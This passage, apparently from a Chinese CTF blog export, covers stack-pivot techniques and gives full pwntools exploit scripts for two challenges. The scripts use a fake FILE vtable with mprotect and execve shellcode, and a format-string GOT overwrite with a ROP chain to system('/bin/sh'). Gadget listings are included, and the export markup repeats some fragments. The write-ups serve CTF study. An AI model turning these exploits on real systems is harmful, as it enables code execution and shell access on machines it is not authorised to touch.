class=\"string\">'printf'</span>]</div><div class=\"line\"><span class=\"meta\">#binsh_addr = printf_addr + next(libc.search(<span class=\"string\">'/bin/sh'</span>)) - libc.symbols[<span class=\"string\">'printf'</span>]</span></div><div class=\"line\"></div><div class=\"line\">print(<span class=\"string\">'system_addr = '</span> + <span class=\"built_in\">hex</span>(system_addr))</div><div class=\"line\"></div><div class=\"line\">p.<span class=\"built_in\">send</span>(p32(system_addr))</div><div class=\"line\">p.<span class=\"built_in\">send</span>(<span class=\"string\">\"/bin/sh\\0\"</span>)</div><div class=\"line\"></div><div class=\"line\">p.interactive()</div></pre></td></tr></table></figure></p>\n<h2 id=\"2017BCTF100levels\"><a href=\"#2017BCTF100levels\" class=\"headerlink\" title=\"2017BCTF100levels\"></a>2017BCTF100levels</h2>","excerpt":"","more":"<h2 id=\"序\"><a href=\"#序\" class=\"headerlink\" title=\"序\"></a>序</h2><p>连着好几次遇到栈迁移问题了，总结记录下。<br>每一种的类型都不一样，不过目的都是一样的，就是将esp或ebp变为我们可控的数据，大概可以分为三类：</p>\n<ol>\n<li>stack pivot后mprotect</li>\n<li>ebp的partial overwrite</li>\n<li>栈迁移的gadget</li>\n</ol>\n<h2 id=\"i春秋百度杯try-to-pwn\"><a href=\"#i春秋百度杯try-to-pwn\" class=\"headerlink\" title=\"i春秋百度杯try to pwn\"></a>i春秋百度杯try to pwn</h2><p>我们用<code>0xff</code>来填充<code>FILE</code>结构体，尝试中发现填充为其他数据的话会出现调用到其他函数而报错的情况。</p>\n<p>eax由这条语句赋值，其中ebx与eax的值为：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">EAX</span>  <span class=\"number\">0x80efa9c</span> (x+<span class=\"number\">188</span>) —▸ <span class=\"number\">0x80e2b6d</span> (__EH_FRAME_BEGIN__+<span class=\"number\">38021</span>) ◂— <span class=\"keyword\">pop</span>    <span class=\"built_in\">esp</span></div><div class=\"line\"><span class=\"built_in\">EBX</span>  <span class=\"number\">0x80efa04</span> (x+<span class=\"number\">36</span>) ◂— <span class=\"number\">0xffffff7f</span></div></pre></td></tr></table></figure></p>\n<p><code>0x804f915 &lt;fclose+53&gt;     mov    eax, dword ptr [ebx + 0x94]</code><br>ebx的值为<code>fake_FILE_addr+36</code><br>eax的值为<code>fake_vtable</code>的前4个字节</p>\n<p>我们存储shellcode的地址的addr为<code>fake_vtable</code>的4到8个字节。</p>\n<p>还要注意下mprotexct的函数调用规定<br><code>int mprotect(void *addr, size_t len, int prot);</code><br><figure class=\"highlight nimrod\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">mprotect()  changes  the  access protections <span class=\"keyword\">for</span> the calling process's memory pages containing <span class=\"built_in\">any</span> part <span class=\"keyword\">of</span> the address <span class=\"built_in\">range</span> <span class=\"keyword\">in</span> the interval [<span class=\"keyword\">addr</span>, <span class=\"keyword\">addr</span>+len-<span class=\"number\">1</span>].  <span class=\"keyword\">addr</span> must be aligned  to  a page boundary.</div></pre></td></tr></table></figure></p>\n<p>注意这里的地址调用一定是<strong>页对齐</strong>的。<br><code>int prot</code>这里的数字可以简单参照linux的权限<code>rwx</code>，总是7是可读可写可执行。</p>\n<p>这一题在尝试过程中发现\\x0b会截断，所以我们要吧pwntools产生的shellcode简单修改下。</p>\n<p>exp(参考了<a href=\"http://blog.csdn.net/qq_29343201/article/details/69666824\">这篇文章</a>)：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env python</div><div class=\"line\"># coding=utf-<span class=\"number\">8</span></div><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\">local = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">global</span> p</div><div class=\"line\"></div><div class=\"line\">if slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\">if local:</div><div class=\"line\">    p = process(<span class=\"string\">'./fake'</span>)</div><div class=\"line\"><span class=\"symbol\">else:</span></div><div class=\"line\">    p = remote()</div><div class=\"line\"></div><div class=\"line\">if local <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, open(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./fake'</span>)</div><div class=\"line\">name_addr = <span class=\"number\">0x80EF9E0</span></div><div class=\"line\">mprotect_addr = elf.symbols[<span class=\"string\">'mprotect'</span>]</div><div class=\"line\">un_FILE_addr = <span class=\"number\">0x80EFA00</span></div><div class=\"line\">fake_FILE_addr = <span class=\"number\">0x80EFA04</span></div><div class=\"line\">fake_vtable_addr = fake_FILE_addr + <span class=\"number\">0x94</span> + <span class=\"number\">0x4</span></div><div class=\"line\">x_r = <span class=\"number\">0x08048f66</span></div><div class=\"line\">p_r = <span class=\"number\">0x080e2b6d</span></div><div class=\"line\"></div><div class=\"line\">offset = un_FILE_addr - name_addr</div><div class=\"line\"></div><div class=\"line\">shellcode = <span class=\"string\">'''</span></div><div class=\"line\">/* execve(path=<span class=\"string\">'/bin///sh'</span>, argv=[<span class=\"string\">'sh'</span>], envp=<span class=\"number\">0</span>) */</div><div class=\"line\">/* <span class=\"keyword\">push</span> <span class=\"string\">'/bin///sh\\x00'</span> */</div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"number\">0x68</span></div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"number\">0x732f2f2f</span></div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"number\">0x6e69622f</span></div><div class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">ebx</span>, <span class=\"built_in\">esp</span></div><div class=\"line\">/* <span class=\"keyword\">push</span> argument array [<span class=\"string\">'sh\\x00'</span>] */</div><div class=\"line\">/* <span class=\"keyword\">push</span> <span class=\"string\">'sh\\x00\\x00'</span> */</div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"number\">0x1010101</span></div><div class=\"line\"><span class=\"keyword\">xor</span> <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">esp</span>], <span class=\"number\">0x1016972</span></div><div class=\"line\"><span class=\"keyword\">xor</span> <span class=\"built_in\">ecx</span>, <span class=\"built_in\">ecx</span></div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"built_in\">ecx</span> /* null terminate */</div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"number\">4</span></div><div class=\"line\"><span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span></div><div class=\"line\"><span class=\"keyword\">add</span> <span class=\"built_in\">ecx</span>, <span class=\"built_in\">esp</span></div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"built_in\">ecx</span> /* <span class=\"string\">'sh\\x00'</span> */</div><div class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">ecx</span>, <span class=\"built_in\">esp</span></div><div class=\"line\"><span class=\"keyword\">xor</span> <span class=\"built_in\">edx</span>, <span class=\"built_in\">edx</span></div><div class=\"line\">/* <span class=\"keyword\">call</span> execve() */</div><div class=\"line\">/* <span class=\"keyword\">push</span> SYS_execve */</div><div class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, <span class=\"number\">0xf</span></div><div class=\"line\"><span class=\"keyword\">sub</span> <span class=\"built_in\">eax</span>, <span class=\"number\">0x4</span></div><div class=\"line\"><span class=\"keyword\">push</span> <span class=\"built_in\">eax</span></div><div class=\"line\"><span class=\"keyword\">pop</span> <span class=\"built_in\">eax</span></div><div class=\"line\"><span class=\"keyword\">int</span> <span class=\"number\">0x80</span></div><div class=\"line\"><span class=\"string\">'''</span></div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'name?\\n'</span>)</div><div class=\"line\">    payload = <span class=\"string\">'a'</span> * offset</div><div class=\"line\">    # fake_FILE_addr</div><div class=\"line\">    payload += p32(fake_FILE_addr)</div><div class=\"line\">    # fake_FILE</div><div class=\"line\">    payload += <span class=\"string\">'\\xff'</span> * <span class=\"number\">0x94</span></div><div class=\"line\">    # fake_jmp_t</div><div class=\"line\">    payload += p32(fake_vtable_addr)</div><div class=\"line\"></div><div class=\"line\">    # fake_vtable</div><div class=\"line\">    payload += p32(p_r)</div><div class=\"line\">    payload += p32(un_FILE_addr + <span class=\"number\">300</span>)</div><div class=\"line\">    payload += p32(x_r) *  <span class=\"number\">16</span></div><div class=\"line\"></div><div class=\"line\">    # mprotect</div><div class=\"line\">    junk = <span class=\"number\">300</span> - len(payload) + <span class=\"number\">32</span></div><div class=\"line\">    payload += cyclic(junk)</div><div class=\"line\">    payload += p32(mprotect_addr)</div><div class=\"line\">    payload += p32(un_FILE_addr + <span class=\"number\">300</span> + <span class=\"number\">20</span>) # shellcode addr</div><div class=\"line\">    payload += p32(<span class=\"number\">0x080ef000</span>)</div><div class=\"line\">    payload += p32(<span class=\"number\">1024</span>)</div><div class=\"line\">    payload += p32(<span class=\"number\">7</span>)</div><div class=\"line\">    payload += asm(shellcode)</div><div class=\"line\">    gdb.attach(p)</div><div class=\"line\"></div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\"></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\"></div><div class=\"line\">if __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure></p>\n<h2 id=\"南京线下赛decoder\"><a href=\"#南京线下赛decoder\" class=\"headerlink\" title=\"南京线下赛decoder\"></a>南京线下赛decoder</h2><p><code>checksec</code>:<br><figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali ~/c/NJoffline<span class=\"comment\"># checksec decoder</span></div><div class=\"line\">[*] <span class=\"string\">'/root/ctf-problem/NJoffline/decoder'</span></div><div class=\"line\"><span class=\"attr\">    Arch:</span>     i386<span class=\"bullet\">-32</span>-little</div><div class=\"line\"><span class=\"attr\">    RELRO:</span>    Partial RELRO</div><div class=\"line\"><span class=\"attr\">    Stack:</span>    <span class=\"literal\">No</span> canary found</div><div class=\"line\"><span class=\"attr\">    NX:</span>       NX enabled</div><div class=\"line\"><span class=\"attr\">    PIE:</span>      <span class=\"literal\">No</span> PIE (<span class=\"number\">0x8048000</span>)</div></pre></td></tr></table></figure></p>\n<p>没开什么保护，观察后发现存在栈溢出，但是不能构造rop，因为esp的地址是由栈上数据给的，直接覆盖的话会ret到奇怪的地方去，也就是说造成栈溢出的栈底数据是我们不可控的。</p>\n<p>所以，如果我们能够栈的位置到可控部分，我们就可以劫持eip，构造rop chain。</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali ~/c/NJoffline# ROPgadget --binary decoder | grep <span class=\"string\">'esp'</span></div><div class=\"line\"><span class=\"number\">0x08048490</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">byte</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">eax</span>], <span class=\"built_in\">al</span> <span class=\"comment\">; add esp, 8 ; pop ebx ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048605</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0x10</span> <span class=\"comment\">; leave ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048b31</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0x40</span> <span class=\"comment\">; pop edi ; pop ebp ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048d35</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0xc</span> <span class=\"comment\">; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048492</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">8</span> <span class=\"comment\">; pop ebx ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048af7</span> : <span class=\"keyword\">and</span> <span class=\"built_in\">esp</span>, <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">ebx</span> + <span class=\"number\">0x804b054</span>] <span class=\"comment\">; nop ; pop ebp ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048cd7</span> : <span class=\"keyword\">clc</span> <span class=\"comment\">; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class=\"line\"><span class=\"number\">0x0804848e</span> : <span class=\"keyword\">inc</span> <span class=\"built_in\">byte</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">eax</span>] <span class=\"comment\">; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048687</span> : <span class=\"keyword\">je</span> <span class=\"number\">0x8048684</span> <span class=\"comment\">; push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx</span></div><div class=\"line\"><span class=\"number\">0x08048d33</span> : <span class=\"keyword\">jne</span> <span class=\"number\">0x8048d21</span> <span class=\"comment\">; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048cd5</span> : <span class=\"keyword\">lea</span> <span class=\"built_in\">esp</span>, <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">ebp</span> - <span class=\"number\">8</span>] <span class=\"comment\">; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048cdb</span> : <span class=\"keyword\">lea</span> <span class=\"built_in\">esp</span>, <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">ecx</span> - <span class=\"number\">4</span>] <span class=\"comment\">; ret</span></div><div class=\"line\"><span class=\"number\">0x08048d4f</span> : <span class=\"keyword\">mov</span> <span class=\"built_in\">bl</span>, <span class=\"number\">0x22</span> <span class=\"comment\">; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret</span></div><div class=\"line\"><span class=\"number\">0x0804868a</span> : <span class=\"keyword\">mov</span> <span class=\"built_in\">ebp</span>, <span class=\"built_in\">esp</span> <span class=\"comment\">; sub esp, 0x14 ; push eax ; call edx</span></div><div class=\"line\"><span class=\"number\">0x080485d0</span> : <span class=\"keyword\">mov</span> <span class=\"built_in\">ebx</span>, <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">esp</span>] <span class=\"comment\">; ret</span></div><div class=\"line\"><span class=\"number\">0x08048b30</span> : <span class=\"keyword\">nop</span> <span class=\"comment\">; add esp, 0x40 ; pop edi ; pop ebp ; ret</span></div><div class=\"line\"><span class=\"number\">0x080485cf</span> : <span class=\"keyword\">nop</span> <span class=\"comment\">; mov ebx, dword ptr [esp] ; ret</span></div><div class=\"line\"><span class=\"number\">0x080485cd</span> : <span class=\"keyword\">nop</span> <span class=\"comment\">; nop ; mov ebx, dword ptr [esp] ; ret</span></div><div class=\"line\"><span class=\"number\">0x080485cb</span> : <span class=\"keyword\">nop</span> <span class=\"comment\">; nop ; nop ; mov ebx, dword ptr [esp] ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048cda</span> : <span class=\"keyword\">pop</span> <span class=\"built_in\">ebp</span> <span class=\"comment\">; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048cd8</span> : <span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span> <span class=\"comment\">; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048cd9</span> : <span class=\"keyword\">pop</span> <span class=\"built_in\">edi</span> <span class=\"comment\">; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048689</span> : <span class=\"keyword\">push</span> <span class=\"built_in\">ebp</span> <span class=\"comment\">; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx</span></div><div class=\"line\"><span class=\"number\">0x08048634</span> : <span class=\"keyword\">sub</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0x10</span> <span class=\"comment\">; push eax ; push 0x804b04c ; call edx</span></div><div class=\"line\"><span class=\"number\">0x080485fb</span> : <span class=\"keyword\">sub</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0x14</span> <span class=\"comment\">; push 0x804b04c ; call eax</span></div><div class=\"line\"><span class=\"number\">0x0804868c</span> : <span class=\"keyword\">sub</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0x14</span> <span class=\"comment\">; push eax ; call edx</span></div><div class=\"line\"><span class=\"number\">0x08048475</span> : <span class=\"keyword\">sub</span> <span class=\"built_in\">esp</span>, <span class=\"number\">8</span> <span class=\"comment\">; call 0x80485d9</span></div><div class=\"line\"><span class=\"number\">0x08048af6</span> : <span class=\"keyword\">xor</span> <span class=\"built_in\">esp</span>, <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">ebx</span>] <span class=\"comment\">; mov dword ptr [0x804b054], eax ; nop ; pop ebp ; ret</span></div></pre></td></tr></table></figure>\n<p>发现这几条还是可用的：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0x08048490</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">byte</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">eax</span>], <span class=\"built_in\">al</span> <span class=\"comment\">; add esp, 8 ; pop ebx ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048605</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0x10</span> <span class=\"comment\">; leave ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048b31</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0x40</span> <span class=\"comment\">; pop edi ; pop ebp ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048d35</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">0xc</span> <span class=\"comment\">; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class=\"line\"><span class=\"number\">0x08048492</span> : <span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>, <span class=\"number\">8</span> <span class=\"comment\">; pop ebx ; ret</span></div></pre></td></tr></table></figure></p>\n<p>于是我们的思路如下：</p>\n<ol>\n<li>在栈上利用gadget<code>0x08048b31</code>布置好ropchain</li>\n<li>利用fsb将fflish改为我们的gadget<code>0x08048b31</code></li>\n<li>在bss写入<code>/bin/sh</code></li>\n<li>修改fflush为system</li>\n</ol>\n<p>附上南大某女生exp:<br><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"meta\"># coding=utf-8</span></div><div class=\"line\">from pwn import *</div><div class=\"line\">import base64</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\"><span class=\"keyword\">local</span> = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context.log_level = <span class=\"literal\">True</span></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">local</span>:</div><div class=\"line\">    p = process(<span class=\"string\">'./decoder'</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'/lib32/libc.so.6'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote(<span class=\"string\">'172.16.1.10'</span>, <span class=\"number\">20000</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'./lib/i386-linux-gnu/libc-2.19.so'</span>)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'decoder'</span>)</div><div class=\"line\"></div><div class=\"line\">printf_got = elf.got[<span class=\"string\">'printf'</span>]\t\t<span class=\"meta\">#  0x80484c0</span></div><div class=\"line\">printf_plt = elf.symbols[<span class=\"string\">'printf'</span>] </div><div class=\"line\">read_addr = elf.symbols[<span class=\"string\">'read'</span>]</div><div class=\"line\">fflush_plt = elf.symbols[<span class=\"string\">'fflush'</span>]</div><div class=\"line\"></div><div class=\"line\">realloc_got = elf.got[<span class=\"string\">'realloc'</span>]</div><div class=\"line\">fflush_got = elf.got[<span class=\"string\">'fflush'</span>]</div><div class=\"line\"></div><div class=\"line\">main_addr = <span class=\"number\">0x804836e</span></div><div class=\"line\"></div><div class=\"line\">print(<span class=\"string\">'fflush_got = '</span> + <span class=\"built_in\">hex</span>(fflush_got))</div><div class=\"line\">print(<span class=\"string\">'printf_plt = '</span> + <span class=\"built_in\">hex</span>(printf_plt))</div><div class=\"line\"></div><div class=\"line\">addesp_72 = <span class=\"number\">0x08048b31</span></div><div class=\"line\">rodata = <span class=\"number\">0x8048de0</span> <span class=\"meta\"># <span class=\"string\">'%d:%s'</span></span></div><div class=\"line\">bss_addr = <span class=\"number\">0x804b050</span></div><div class=\"line\"></div><div class=\"line\">s = base64.b64encode(<span class=\"string\">'%02052d%20$hn%033581d%21$hn%22$x'</span>)  <span class=\"meta\"># add_esp</span></div><div class=\"line\"></div><div class=\"line\">payload = s + (<span class=\"number\">13</span> - len(s) / <span class=\"number\">4</span>) * p32(<span class=\"number\">0</span>) + p32(printf_plt)+ p32(addesp_72) + p32(rodata) + p32(<span class=\"number\">1</span>) + p32(printf_got)</div><div class=\"line\"><span class=\"meta\"># printf(rodata, <span class=\"string\">'1'</span>, printf_got) </span></div><div class=\"line\"><span class=\"meta\"># 0xffa8a3f4 </span></div><div class=\"line\">payload += p32(fflush_got + <span class=\"number\">2</span>) + p32(fflush_got) + p32(fflush_got) </div><div class=\"line\"></div><div class=\"line\">payload += p32(<span class=\"number\">0x1</span>) * <span class=\"number\">0xc</span>  + p32(read_addr) + p32(addesp_72) + p32(<span class=\"number\">0</span>) + p32(fflush_got) + p32(<span class=\"number\">4</span>)   <span class=\"meta\">#0xffa8a434 -&gt; read</span></div><div class=\"line\"></div><div class=\"line\">payload += p32(<span class=\"number\">0x2</span>) * <span class=\"number\">0xf</span> + p32(read_addr) + p32(addesp_72) + p32(<span class=\"number\">0</span>) + p32(bss_addr) + p32(<span class=\"number\">8</span>)</div><div class=\"line\"></div><div class=\"line\">payload += p32(<span class=\"number\">0x3</span>) * <span class=\"number\">0xf</span> + p32(fflush_plt) + p32(<span class=\"number\">0xdeadbeef</span>) + p32(bss_addr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\"># gdb.attach(p, open(<span class=\"string\">'debug'</span>))</span></div><div class=\"line\">gdb.attach(p)</div><div class=\"line\">p.recvuntil(<span class=\"string\">'DECODER\\n'</span>)</div><div class=\"line\">p.sendline(payload)</div><div class=\"line\"></div><div class=\"line\">p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\">printf_addr = u32(p.recv(<span class=\"number\">4</span>))</div><div class=\"line\"></div><div class=\"line\">system_addr = printf_addr + libc.symbols[<span class=\"string\">'system'</span>] - libc.symbols[<span class=\"string\">'printf'</span>]</div><div class=\"line\"><span class=\"meta\">#binsh_addr = printf_addr + next(libc.search(<span class=\"string\">'/bin/sh'</span>)) - libc.symbols[<span class=\"string\">'printf'</span>]</span></div><div class=\"line\"></div><div class=\"line\">print(<span class=\"string\">'system_addr = '</span> + <span class=\"built_in\">hex</span>(system_addr))</div><div class=\"line\"></div><div class=\"line\">p.<span class=\"built_in\">send</span>(p32(system_addr))</div><div class=\"line\">p.<span class=\"built_in\">send</span>(<span class=\"string\">\"/bin/sh\\0\"</span>)</div><div class=\"line\"></div><div class=\"line\">p.interactive()</div></pre></td></tr></table></figure></p>\n<h2 id=\"2017BCTF100levels\"><a href=\"#2017BCTF100levels\" class=\"headerlink\" title=\"2017BCTF100levels\"></a>2017BCTF100levels</h2>"},{"title":"pwn的一些小心得","date":"2017-04-26T12:19:33.000Z","_content":"\n## libheaps与pwndbg兼容\n\n其实本来也不存在conflict，就是几个命令用了同样的名字，所以我安装libheap的时候就改了几个命令的名字。\n\n注册command的文件在这个目录下：\n`/root/libheap/libheap/frontend/commands/gdb`\n\n改几个注册名就好，下面以我把`heap`改为`libheap`为例，当然可能改成`heap_lib`这种更合适。。。\n<!--more-->\n```\nclass heap(gdb.Command):\n    